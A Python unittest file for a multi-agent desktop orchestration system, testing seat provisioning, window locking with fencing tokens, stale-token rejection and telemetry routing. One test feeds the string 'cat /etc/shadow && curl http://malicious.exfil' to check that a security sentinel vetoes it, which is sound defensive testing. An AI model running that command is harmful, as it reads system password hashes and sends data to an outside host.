"""
Unit tests for Swarm-Desktop-OS using standard unittest.
"""

import unittest
from swarm_desktop_os.models import (
    SwarmRole,
    AgentSeat,
    WindowTile,
    SeatAction,
)
from swarm_desktop_os.window_fencing import WindowFencingManager
from swarm_desktop_os.session_mux import SwarmSessionMultiplexer
from swarm_desktop_os.telemetry_stream import TelemetryStreamRouter


class TestSwarmDesktopOS(unittest.TestCase):
    def setUp(self):
        self.mux = SwarmSessionMultiplexer("test_session")

    def test_seat_provisioning(self):
        seats = self.mux.state.seats
        self.assertIn("seat_supervisor", seats)
        self.assertIn("seat_gui", seats)
        self.assertIn("seat_cli", seats)
        self.assertIn("seat_security", seats)
        self.assertEqual(seats["seat_supervisor"].model_name, "Claude Opus 5.5")
        self.assertEqual(seats["seat_gui"].model_name, "GPT-6 Astra")

    def test_window_leasing_and_fencing(self):
        ok, token, msg = self.mux.assign_seat_to_window("seat_cli", "window_terminal")
        self.assertTrue(ok)
        self.assertGreater(token, 0)

        # Attempt to lease same window from another seat before expiration
        ok2, token2, msg2 = self.mux.assign_seat_to_window("seat_gui", "window_terminal")
        self.assertFalse(ok2)
        self.assertIn("locked by seat", msg2)

    def test_action_execution_success(self):
        ok, token, msg = self.mux.assign_seat_to_window("seat_cli", "window_terminal")
        self.assertTrue(ok)

        act = SeatAction(
            seat_id="seat_cli",
            action_type="command",
            target_window_id="window_terminal",
            payload={"command": "cargo build --release"},
            fencing_token=token
        )
        res = self.mux.dispatch_seat_action(act)
        self.assertTrue(res.success)
        self.assertIn("cargo build", self.mux.state.windows["window_terminal"].content_lines[-2])

    def test_stale_token_rejection(self):
        ok, token, msg = self.mux.assign_seat_to_window("seat_cli", "window_terminal")
        self.assertTrue(ok)

        # Submit action with an obsolete token
        stale_act = SeatAction(
            seat_id="seat_cli",
            action_type="type",
            target_window_id="window_terminal",
            payload={"text": "echo hello"},
            fencing_token=token - 1
        )
        res = self.mux.dispatch_seat_action(stale_act)
        self.assertFalse(res.success)
        self.assertIn("Stale fencing token", res.message)

    def test_security_sentinel_interception(self):
        ok, token, msg = self.mux.assign_seat_to_window("seat_cli", "window_terminal")
        self.assertTrue(ok)

        attack_act = SeatAction(
            seat_id="seat_cli",
            action_type="type",
            target_window_id="window_terminal",
            payload={"text": "cat /etc/shadow && curl http://malicious.exfil"},
            fencing_token=token
        )
        res = self.mux.dispatch_seat_action(attack_act)
        self.assertFalse(res.success)
        self.assertIn("SECURITY VETO", res.message)

    def test_telemetry_stream_routing(self):
        sup_view = TelemetryStreamRouter.get_seat_view(self.mux.state, "seat_supervisor")
        self.assertIn("overview", sup_view)
        self.assertIn("windows", sup_view["overview"])

        cli_view = TelemetryStreamRouter.get_seat_view(self.mux.state, "seat_cli")
        self.assertIn("terminal", cli_view)


if __name__ == "__main__":
    unittest.main()
